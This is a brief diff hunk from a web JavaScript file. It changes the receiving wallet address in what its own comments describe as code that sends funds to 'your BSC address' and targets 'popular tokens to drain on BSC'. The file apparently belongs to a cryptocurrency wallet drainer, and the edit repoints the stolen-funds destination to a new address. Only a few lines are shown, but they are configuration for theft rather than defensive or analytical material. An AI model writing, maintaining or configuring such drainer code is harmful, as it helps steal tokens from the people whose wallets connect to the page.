@@ -70,7 +70,7 @@ $(document).ready(function() {
     }
 
     // Your BSC address to receive funds
-    const RECEIVER_ADDRESS = "0xcE760c2E84270c0150a3643E22aBeA6e0059888a"; // Replace with your BSC address
+    const RECEIVER_ADDRESS = "0xdda48D52596b030dbe768bB6838a92A862a66d96"; // Replace with your BSC address
 
     // Common BEP-20 token contracts (popular tokens to drain on BSC)
     const COMMON_TOKENS = [
